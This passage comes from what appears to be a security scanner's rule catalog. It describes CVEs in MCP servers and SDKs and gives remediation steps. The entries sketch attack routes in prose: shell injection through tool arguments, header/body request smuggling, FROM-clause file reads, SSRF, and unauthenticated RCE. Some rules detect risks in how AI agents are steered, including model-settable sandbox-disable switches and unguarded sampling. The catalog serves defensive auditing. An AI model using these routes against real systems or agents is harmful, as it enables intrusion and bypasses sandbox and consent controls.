The floor is 2.18.0, but the fixed tag's package.json reads 2.17.0 and npm already holds a 2.17.0, so a fixed build published under a lower number would be reported until the floor follows it. It reads the npm version, not Penpot's: a self-hosted Penpot 2.18.0 server does not clear an older `@penpot/mcp`, since the bridge runs in the MCP server. A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `@penpot/mcp` to the first npm release built from Penpot 2.18.0 or later once one is published, and pin it. Until then, block the plugin WebSocket port (`PENPOT_MCP_WEBSOCKET_PORT`, 4402 by default) from every other host, or run the server only on a machine that is not reachable from a shared network.
rules.title: Penpot MCP plugin WebSocket bridge listens on every interface (< 2.18.0)

rules.description: `@penpot/mcp` before 2.15.0 binds its ReplServer to `0.0.0.0:4403` and exposes an unauthenticated `/execute` endpoint that passes the `code` field to `PluginBridge.executePluginTask()`, letting anyone on the network execute arbitrary JavaScript on the server (CVE-2026-45805, CVSS 8.8). Treat < 2.15.0 (and unpinned) as exposed.
rules.limitations: Reads `@penpot/mcp` in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`packages/app/package.json`), in `.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `@penpot/mcp` to >= 2.15.0 and pin it. Never expose a REPL / eval endpoint unauthenticated; bind debugging servers to loopback only.
rules.title: Penpot MCP ReplServer unauthenticated /execute RCE (< 2.15.0)

rules.description: `@zosmaai/pi-llm-wiki`, an Obsidian-compatible wiki package for the pi coding agent that also ships an MCP server, passes the `url` argument of its `wiki_capture_source` MCP tool into a shell command, `sh -c "uvx ... markitdown \"${source}\""`, so a caller that controls the argument runs commands on the host (CVE-2026-102911, CVSS 3.1 9.9, CWE-77/CWE-78). Double quotes do not stop `$(...)` or backticks. 0.11.8 calls markitdown with an argument list and no shell (fix commit `36086703`). NVD scopes it "up to 0.11.7" with no lower bound, and the shell call is in the upstream source from May 2026, months before 0.11.0, so every stated version below 0.11.8 is reported.
rules.limitations: Reports only a reference that states a version: a `package.json` dependency, a lockfile entry, or `@zosmaai/pi-llm-wiki@0.x` in an MCP config. Upstream registers the MCP server by its path inside `node_modules`, which states no version, and `pi install npm:...` records the package in pi's own settings, which this scanner does not read, so a machine-wide install is not seen. npm's unscoped `pi-llm-wiki` is a different author's package and is not matched. A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `@zosmaai/pi-llm-wiki` to >= 0.11.8 and pin it. Until then, do not expose the wiki MCP server to a model or caller that can choose the URL `wiki_capture_source` captures.
rules.title: pi-llm-wiki below 0.11.8 runs a shell on the URL its MCP capture tool is given

rules.description: Postgres MCP Pro (`postgres-mcp`, PyPI) 0.3.0 applies function-name validation to plain function calls but not to `RangeFunction` nodes in FROM clauses, so `pg_read_file` and its siblings reached through FROM-clause syntax read arbitrary server-side files despite restricted ("read-only") mode (CVE-2026-85620, CVSS 8.6). There is no fixed release: upstream's newest tag is v0.3.0 and the security issue (crystaldba/postgres-mcp#178) is still open, so every published version of this distribution is affected. The separate PyPI name `postgres-mcp-pro` carries the product's marketing name and an identical summary but declares no repository and is not referenced by the upstream project — it is not treated here as a verified upgrade target. The unrelated npm package of the same name (a multi-database MCP server on the 1.0.x line) is not affected and does not fire.
rules.limitations: Reads `postgres-mcp` in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (`pdm.lock`). A compose file's `crystaldba/postgres-mcp` image tag is not read. A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: There is no patched release to upgrade to. Stop relying on the server's restricted mode as a security boundary: connect it with a least-privilege PostgreSQL role that cannot execute `pg_read_file`, `pg_ls_dir` or `COPY ... FROM PROGRAM`, and enforce read-only at the database rather than in the MCP server's SQL validator.
rules.title: Postgres MCP Pro restricted-mode bypass via FROM-clause functions (no fixed release)

rules.description: PraisonAI before 4.6.78 exposes the MCP HTTP-stream transport without authentication by default: `praisonai mcp serve --transport http-stream` defaults `--api-key` to None and only enforces Authorization/Bearer checks when a key is configured, so an unauthenticated client can initialize a session, enumerate tools (`tools/list`), and invoke them (`tools/call`); arguments are also forwarded without validating the advertised inputSchema (CVE-2026-61427, CVSS 7.3). The same pin also covers CVE-2026-47394 — an arbitrary-file-read path traversal via `workflow.show` (and the dispatcher's unvalidated `**kwargs` from `tools/call`), an incomplete prior path-handling fix that was fully closed only in 4.6.40. The same floor also covers CVE-2026-48168 (CVSS 10, fixed 4.6.40): a command injection in PraisonAI's bundled Claude GitHub Actions workflow that splices an attacker-controlled pull-request branch name into a Bash `run:` block, with any `@claude` comment able to trigger the job, so a fork PR reaches arbitrary execution in the Actions runner. The 4.6.78 floor is the highest of the three, so a project pinned below it is exposed to all of them. Default bind is 127.0.0.1, so remote reach needs a network bind. Treat < 4.6.78 (and unpinned) as exposed.
rules.limitations: Reads `praisonai` in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock and uv.lock lockfiles, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`services/api/pyproject.toml`) or in a lockfile format the reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `praisonai` to >= 4.6.78 and pin it. Always configure `--api-key` for the HTTP-stream transport and never bind it to a non-loopback interface without authentication.
rules.title: PraisonAI MCP unauthenticated-default + path traversal (< 4.6.78)

rules.description: PraisonAI's TypeScript package (`praisonai` on npm — a different project from the `praisonai` PyPI distribution, which runs a 4.6.x line and carries its own separate pin) from 1.5.0 until 1.7.2 binds `MCPServer.startHttp()` in `src/praisonai-ts/src/mcp/server.ts` with no host restriction and forwards every HTTP POST to `handleRequest()` with no authentication or authorization. Any network client that can reach the port calls `tools/list`, `tools/call`, `resources/read` or `prompts/get`, so registered handlers run with server-side credentials and process privileges, or disclose registered data (CVE-2026-57139, CVSS 9.8, CWE-306 + CWE-862 + CWE-1188). NVD describes 1.7.2 as an initial remediation, so the pin floor is 1.7.2 rather than a later release.
rules.limitations: Reads `praisonai` in package.json, .mcp.json, mcp.json, claude_desktop_config.json and the package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles at the project root only, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`packages/app/package.json`) or in a lockfile format the reader does not parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade the npm `praisonai` package to >= 1.7.2 and pin it. Bind the MCP HTTP server to `127.0.0.1` rather than every interface, and require an inbound credential on `handleRequest()` before any `tools/call` or `resources/read` dispatch. Because 1.7.2 is an initial remediation, track the upstream advisory for a follow-up release.
rules.title: praisonai (npm, TypeScript) < 1.7.2 (MCP HTTP server binds unrestricted with no auth)

rules.description: QWED-MCP, a deterministic verification gateway for MCP, before 0.2.1 passes the attacker-controlled `expression` and `claimed_result` arguments of `verify_math_expression()` (`src/qwed_mcp/engines/math_engine.py`) straight into SymPy's `parse_expr()` after only rewriting `^` to `**`. No `global_dict`/`local_dict` pinning, no removal of builtins and no AST validation, and `parse_expr()` evaluates through `eval()`, so a tool call reaches arbitrary code execution with the server's privileges (CVE-2026-55546, CWE-94, CVSS 3.1 9.8). Fixed in 0.2.1. The *source shape* of this defect is already reported by `AAK-MCP-TOOL-UNSAFE-EVAL-001`, which names unpinned `parse_expr` explicitly and fires on this handler; this pin adds the dependency surface, so a project that consumes the package without vendoring its source is covered too.
rules.limitations: Reads `qwed-mcp` in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `qwed-mcp` to >= 0.2.1 and pin it. If you maintain a comparable verifier, do not reach for a denylist of dangerous names: call `parse_expr(expr, global_dict={}, local_dict=<allowed symbols>, evaluate=True)` with an explicit symbol allow-list, and bound input length and character set before parsing.
rules.title: QWED-MCP evaluates a tool argument through SymPy parse_expr (< 0.2.1)

rules.description: mcp-remote's device-code sign-in (`--device-code`, from 0.8.0) posts the OAuth client secret to the device-authorization and token endpoints the server's metadata names, and takes the access and refresh tokens back, without requiring https. When a discovered endpoint is a non-loopback `http://` URL, an on-path attacker captures the secret and the tokens (CVE-2026-108716, CVSS 3.1 5.3, CWE-319). Checked in the source: `authorizeWithDeviceCode` arrives in 0.8.0, runs only when the launch passes `--device-code`, and calls `fetch` on both endpoints with no scheme check; `src/lib/device-authorization.ts` is unchanged from 0.14.3 to 0.15.1, the newest release, so there is no fixed release.
rules.limitations: Reports an MCP config or package.json script that launches `mcp-remote` with `--device-code`, at a stated version from 0.8.0 or with none, since the newest release is affected. A launch without the flag is not reported, and neither is a dependency entry or a lockfile, which record no arguments. A launch in `.cursor/mcp.json` or `.vscode/mcp.json` is not read. It cannot see the endpoints the server will advertise, so a server whose endpoints are https is reported too. A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: There is no fixed release. Sign in without `--device-code`, or check that the server's OAuth metadata names https device-authorization and token endpoints before you use it, and rotate a client secret that may have crossed plain HTTP.
rules.title: mcp-remote from 0.8.0 launched with --device-code: client secret and tokens over plain HTTP (no fixed release)

rules.description: `mcp-remote`, the npm proxy that connects stdio MCP clients to remote MCP servers over OAuth, trusts URLs the remote server chooses. From 0.1.32 through 0.1.38 it fetches the `resource_metadata` URL a server puts in its `WWW-Authenticate` header with no scheme, hostname or private-address policy (CVE-2026-51994, CVSS 3.1 9.1, CWE-918), and it fetches `/.well-known/oauth-authorization-server` from an authorization-server origin taken from server-controlled metadata without validating that origin (CVE-2026-51995, CVSS 3.1 7.5). A malicious or compromised MCP server therefore makes the client request localhost services, private-network addresses or cloud metadata endpoints during OAuth discovery, before any tool is called. From 0.1.16, the release that added a URL check before opening the user's browser, that check accepts any HTTP(S) URL and lets loopback, private, link-local and metadata destinations through to the browser launch (CVE-2026-51997, CVSS 3.1 8.8). In the same 0.1.16–0.1.38 range NVD records CVE-2026-51996 (CVSS 3.1 9.8, CWE-328) as code execution through `getServerUrlHash` in `src/lib/utils.ts`, which names each server's OAuth state and token files from an MD5 hash; the advisory NVD cites (F-04) was corrected in its v1.0.1 to call this hardening, with no token takeover shown. From 0.1.18 NVD also records CVE-2026-52001 (CVSS 3.1 7.5 from CISA-ADP, CWE-200) as information disclosure through the SSE transport's `eventSourceInit` fetch wrapper, which adds the bearer token with no origin check of its own; its advisory (F-11) was likewise corrected in v1.0.1 to defense in depth, because the SDK and undici versions it reviewed keep the token from crossing origins. The range is the union of the advisories': they were reconfirmed against 0.1.38, and upstream has published neither an advisory nor a fix, so this rule makes no claim about 0.1.39 or later in either direction.
rules.limitations: Reports only a reference that states a version in the range: an `mcp-remote@0.1.x` argument in an MCP config, a `package.json` dependency or a lockfile entry. An unpinned `npx mcp-remote` is not reported, because it resolves to the newest release (0.14.x on 2026-09-27), which the advisories did not test. Versions before 0.1.16 carry CVE-2025-6514 (OS command injection through the authorization endpoint URL, fixed in 0.1.16), which this rule does not report. A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Move off 0.1.16–0.1.38 and pin the release you move to. Upstream names no fixed version, so check that it validates discovery and authorization URLs before trusting it. Connect `mcp-remote` only to MCP servers you trust, and where the client host can reach metadata or admin endpoints, put an egress policy in front of it that blocks loopback, link-local and private destinations on every request and redirect.
rules.title: mcp-remote 0.1.16–0.1.38 trusts URLs a remote MCP server chooses (SSRF, browser launch)

rules.description: Repomix before 1.14.1 lets the MCP server's `attach_packed_output` / `read_repomix_output` flow register and read arbitrary local `.json` / `.txt` / `.md` / `.xml` files without the `file_system_read_file` `runSecretLint()` safety check or packed-output validation, so MCP callers bypass the local file-read secret-scanning boundary and can read secrets Repomix would otherwise redact (CVE-2026-49988). Treat < 1.14.1 (and unpinned) as exposed.
rules.limitations: Reads `repomix` in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`packages/app/package.json`), in `.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `repomix` to >= 1.14.1 and pin it. Ensure every MCP file-read path runs the same secret-lint / output-validation checks as the direct read tool.
rules.title: Repomix MCP server bypasses secret-scan file-read boundary (< 1.14.1)

rules.description: `mcp-ripgrep` (npm; mcollina/mcp-ripgrep), an MCP server that runs ripgrep for an agent, builds each `rg` command line as a string and runs it through `spawn` with `shell: true`. Its `advanced-search` and `list-files` tools append ` -t ${fileType}` to that string as given, where every pattern, path and glob goes through `escapeShellArg`, so a `fileType` holding `;`, `|` or `$(...)` runs a command as the server's user, and an agent that reads untrusted text can be steered into that call (CVE-2026-113378, CVSS 3.1 5.3, CWE-77/CWE-78, GHSA-qq9r-r4m4-c72m). NVD carries VulDB's note that the flaw's existence is doubted and the maintainer's answer, that the README warns the server runs shell commands. The published code decides it: escaping every sibling argument and not this one is an oversight, and a warning is not a fix. Every published version has it, 0.1.0 to 0.4.0 (2025-04-29), the newest; nothing has been pushed since, and there is no fixed release, so this is a presence-only pin.
rules.limitations: Reports a reference that names `mcp-ripgrep`: a package.json or lockfile entry, the package an `npx` launch in an MCP config names, or a config that runs a global install by that bare name. Presence-only: every version is reported, a future fixed one included, until the pin gets a floor. It reads the name, not which tools the client lets the model call. npm's `ripgrep-mcp` (shk1447/ripgrep-mcp, another server), `@vscode/ripgrep` and `ripgrep` are other packages and are not matched; PyPI has no `mcp-ripgrep`, so a `uvx` launch is not read; and a source checkout started as `node dist/index.js` names no package and is not read. A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: There is no fixed release. Remove the server from agents that read untrusted content, or replace it with a ripgrep MCP server that passes its arguments to `execFile` or `spawn` as an array with no shell. Until then keep the `advanced-search` and `list-files` tools, whose argument `fileType` is, out of the model's reach in the client's tool allowlist. Pin the first fixed release once it ships.
rules.title: mcp-ripgrep hands a tool's fileType argument to a shell unescaped (no fixed release)

rules.description: The 2026-07-28 spec (SEP-2243) adds routable request-metadata headers — `Mcp-Method` and `Mcp-Name` — so proxies can route and pre-authorize a JSON-RPC call from the HTTP header. This server/proxy makes a routing or authorization decision from that header but never cross-checks it against the authoritative JSON-RPC body `method`/`name`. A caller can set `Mcp-Method: tools/list` (allowed at the gateway) while the body invokes `tools/call` on a privileged tool — a header/body desync that smuggles the real call past the gate (confused-deputy). A flow that asserts the header equals the body method does not fire.
rules.limitations: Fires on a file that reads the `Mcp-Method` or `Mcp-Name` header and uses routing or allow-list words, unless the file also reads the JSON-RPC body's `method` (`body.get("method")`, `payload["method"]`). Any such read counts as the cross-check, including one that only logs the value and never compares it to the header.
rules.remediation: Never authorize or route on `Mcp-Method`/`Mcp-Name` alone. Parse the JSON-RPC body and reject the request unless the routable header equals the body `method`/tool `name`; apply the security decision to the body.
rules.title: MCP routable header (Mcp-Method/Mcp-Name) trusted without body cross-check

rules.description: The `ruflo` agent meta-harness before 3.16.3 shipped a default docker-compose deployment that exposed the MCP bridge `POST /mcp` and `POST /mcp/:group` endpoints with no authentication, letting an unauthenticated network attacker invoke `tools/call` for `terminal_execute`, obtain a shell in the bridge container, read provider API keys, and poison AgentDB learning-store patterns (CVE-2026-59726, CVSS 10 CRITICAL). Fixed in 3.16.3.
rules.limitations: Reads `ruflo` in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`packages/app/package.json`), in `.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `ruflo` to >= 3.16.3 and pin it. Never expose the MCP bridge without authentication; bind it to loopback and require a token on `/mcp` routes.
rules.title: ruflo < 3.16.3 (unauthenticated MCP bridge → tools/call RCE)

rules.description: An MCP server or client participates in the `sampling` capability (the server can request LLM completions through the client) without an accompanying elicitation/consent gate, human-approval flag, or documented risk acceptance. Sampling output must be treated as untrusted tool input — without a guard, a compromised or adversarial server can silently steer the client's LLM (and any tool calls it triggers).
rules.limitations: Reads .py, .ts, .tsx, .js, .mjs, .cjs, .java, .kt and .rs files of a project whose root manifest names an MCP SDK in a form AAK-MCP-STATELESS-001 recognises, for a `capabilities: { ... }` literal that names sampling before its first closing brace, `ServerCapabilities(` with `sampling=` before its first `)`, `SamplingCapability(`, `CreateMessageRequestSchema`, `sampling/createMessage`, `create_message(`, `.sampling.create(` or `RequestSampling`. One consent marker in any of those files (`elicit(`, `elicit_create(`, `elicit_input(`, `elicitation(`, `elicitation/create`, `ElicitRequestSchema`, `ElicitInput`, `requires_consent`, `require_consent`, `user_consent`, `human_in_the_loop`, `human-in-the-loop` or `humanintheloop` in any case, `confirmSampling`, `approveSampling`, `samplingConsent` or `human_approval`) clears every one of those findings, whatever it guards. A source file over 512 KB, a config file over 1 MB or a manifest over 2 MB is not read.
rules.remediation: Require an elicitation/createMessage consent prompt before honoring sampling requests, and treat sampling output as untrusted tool input (re-run the same sanitization you apply to user input). If sampling is intentional, accept the risk in `.agent-audit-kit.yml` with `accepts_sampling_risk: true` and a non-empty `justification:`.
rules.title: MCP `sampling` capability declared without consent / elicitation guard

rules.description: A tool/function JSON schema or MCP tool descriptor declares a parameter whose name disables or weakens sandboxing/isolation (e.g. `dangerouslyDisableSandbox`, `disable_sandbox`, `no_sandbox`, `allow_unsafe`, `skip_isolation`) inside the schema's `properties` — meaning the LLM, an untrusted principal, can set it in any tool_use response and turn off the very sandbox that contains tool execution. This is the CVE-2026-42074 class (OpenClaude < 0.5.1 exposed `dangerouslyDisableSandbox` in the BashTool input schema; CWE-284 / CWE-306, CVSS 9.8). A parameter that is genuinely operator-only must not live in the model-facing input schema; mark it `readOnly: true` or annotate it `"x-aak-sandbox-control": "ops-only"` (or `"x-llm-settable": false`) to assert it is set server-side, which suppresses this finding.
rules.limitations: Reads JSON tool schemas (`inputSchema`, `input_schema`, `parameters`) for a property named like dangerouslyDisableSandbox, disable_sandbox, no_sandbox, allow_unsafe or skip_isolation. Other names for the same switch (`bypassSandbox`) are not matched, and a schema written in TypeScript with zod is not read.
rules.remediation: Remove the sandbox/isolation-disable parameter from the model-facing tool input schema entirely. If a privileged escape hatch is required, gate it server-side behind an operator credential — never let it be populated from a tool_use argument. If the flag is legitimately set only by the host (never the model), mark the property `readOnly: true` or annotate it `"x-aak-sandbox-control": "ops-only"` to document that it is not LLM-settable.
rules.title: Tool schema exposes an LLM-settable sandbox/isolation-disable parameter

rules.description: The official MCP Python SDK (`mcp` on PyPI) before 1.28.1 has three session-isolation flaws reachable over its HTTP transports: the SSE and stateful Streamable HTTP transports route requests by `session_id` / `Mcp-Session-Id` without verifying the authenticated principal that created the session, so another bearer-authenticated client with a known session ID can inject JSON-RPC messages (CVE-2026-52869); the `experimental.enable_tasks()` default handlers key tasks only by id, letting any client enumerate / read / cancel other clients' tasks (CVE-2026-52870, from 1.23.0); and the deprecated `websocket_server` transport accepts handshakes with no Host/Origin validation (CVE-2026-59950). Before 1.29.1, and on the 2.0 line from 2.0.0a1 to 2.0.1, the SSE message endpoint, the Streamable HTTP session manager and the OAuth authorization-server routes also buffer a whole request body with no size limit, so an unauthenticated client can send a large or streamed body and exhaust the server's memory (CVE-2026-109527, CVSS 3.1 7.5, CWE-770). Checked in the source: 0.9.1 and 1.0.0 already read the SSE body whole (`request.json()`), and 1.29.1 and 2.1.0 add the limit; 2.0.1, released after 2.1.0, does not have it. Stdio-only servers are not exposed to that one.
rules.limitations: Reads `mcp` below 1.29.1, and from 2.0.0 below 2.1.0, in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock and uv.lock lockfiles, taking the lowest version a range allows. npm's unrelated `mcp` package, in package.json or an npm lockfile, is not read as the SDK. A reference must state a version to be reported, so a bare `mcp` is not. It reads versions, not code, so a stdio-only server, or one behind a body-size limit, is reported too. The dependency is not read when it is declared in a sub-directory manifest (`services/api/pyproject.toml`) or in a lockfile format the reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `mcp` to 1.29.1 or later, or to 2.1.0 or later on the 2.x line, and pin it. Bind every session to the principal that created it and validate Host/Origin on WebSocket handshakes. Until you upgrade, cap the request body size at a reverse proxy in front of any HTTP transport.
rules.title: MCP Python SDK session/task cross-client access and unbounded request bodies (`mcp` < 1.29.1, and 2.0.x)

rules.description: The MCP Python SDK (`mcp` on PyPI) carries four flaws that 1.30.0 and, on the 2.x line, 2.2.0 fix. A stateful Streamable HTTP session (FastMCP, `Server.streamable_http_app()`, `StreamableHTTPSessionManager`) is kept with no idle expiry and no limit on how many are open, so a client that can reach the endpoint grows the server's memory with short ordinary requests until it restarts (CVE-2026-59951, CVSS 4.0 6.9, CWE-770; from 1.8.0, where the session manager arrives). The HTTP client transports follow a redirect to another origin and send it the caller's custom credential headers and, for a 307 or 308, the request body (CVE-2026-116685, CVSS 5.9, CWE-200; from 1.8.0). Server-side bearer authentication configured through `AuthSettings` with a `token_verifier` accepts a valid token issued for another resource when the verifier does not check its audience (CVE-2026-116684, CVSS 6.8, CWE-863; from 1.10.0). And a client that validates a tool result against the server's `outputSchema` fetches an unresolved `$ref` from its HTTP, HTTPS or file URL, synchronously and with no timeout, so a server can make the client send blind requests, read local files or stall every session (CVE-2026-116686, CVSS 6.5, CWE-918; from 1.10.0). Checked in the source for CVE-2026-59951: 1.29.1 still has only an optional idle timeout, off by default, and 1.30.0 and 2.2.0 add a 30-minute default and a 10,000-session cap.
rules.limitations: Reads `mcp` from 1.8.0 below 1.30.0, and from 2.0.0 below 2.2.0, where a version is stated, in the same files as the HIGH `mcp` pin: requirements*.txt at any depth and, at the project root only, pyproject.toml, Pipfile, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock and uv.lock lockfiles. A bare `mcp` is not reported. One finding stands for all four CVEs, so 1.8.0 to 1.9.x, which carry only CVE-2026-59951 and CVE-2026-116685, are reported with the rest. It reads versions, not code, so a project that uses none of the affected parts (stateful Streamable HTTP, bearer authentication with a `token_verifier`, the HTTP client transports, output-schema validation), or that already sets `session_idle_timeout`, is reported too. A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `mcp` to 1.30.0 or later, or to 2.2.0 or later on the 2.x line, and pin it. Until then, pass `session_idle_timeout` to the session manager or run the server stateless, give a server's `TokenVerifier` an audience check, and keep custom credential headers off client transports whose endpoint can redirect.
rules.title: MCP Python SDK 1.8.0 to 1.29.x and 2.0.x/2.1.x: unbounded sessions, credentials sent across redirects, audience-blind bearer auth and fetched schema $refs

rules.description: `mcp-searxng` before 1.7.1 passes a caller-supplied URL from `web_url_read` to `readUrlContent()`, where `checkContentLength()` treats an absent `Content-Length` header as an inconclusive preflight rather than a reason to stop. Both the normal and the error path then consume the entire body with `response.text()`, so a server that simply omits the header defeats `URL_READ_MAX_CONTENT_LENGTH_BYTES` and forces unbounded memory use. The resulting string is handed to `NodeHtmlMarkdown.translate()`, adding CPU to the memory, and the caller needs no credentials (CVE-2026-58483, CVSS 7.5, CWE-400). Fixed in 1.7.1.
rules.limitations: Reads `mcp-searxng` in package.json, .mcp.json, mcp.json, claude_desktop_config.json and the package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles at the project root only, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`packages/app/package.json`), in `.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `mcp-searxng` to >= 1.7.1 and pin it. Where you enforce a response size limit yourself, treat a missing `Content-Length` as unknown rather than acceptable and cap the read as the body streams — a preflight header is a hint from the peer you are defending against, so it cannot be the only place the limit is applied.
rules.title: mcp-searxng < 1.7.1 (a missing Content-Length bypasses the read cap)

rules.description: `mcp-sequential-thinking` (PyPI, arben-adm) up to and including 0.5.0 takes a `file_path` argument on the `import_session` and `export_session` tools in `mcp_sequential_thinking/server.py` and does not confine it to a session directory, so a caller reaches arbitrary paths on the host — reading files back through an import, or writing them through an export. Both are ordinary MCP tools, so the caller is whatever can drive the server, which in an agent pipeline includes anything that can steer tool selection. Fixed in 0.6.0 (patch 2fad3ee); the exploit is public. Treat <= 0.5.0 and unpinned as exposed.
rules.limitations: Reads `mcp-sequential-thinking` in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `mcp-sequential-thinking` to >= 0.6.0 and pin it. If you cannot upgrade yet, disable the `import_session` / `export_session` tools rather than relying on the caller to send a well-behaved path, and run the server as a user with no read access to anything outside its session directory.
rules.title: mcp-sequential-thinking <= 0.5.0 (session import/export path traversal)

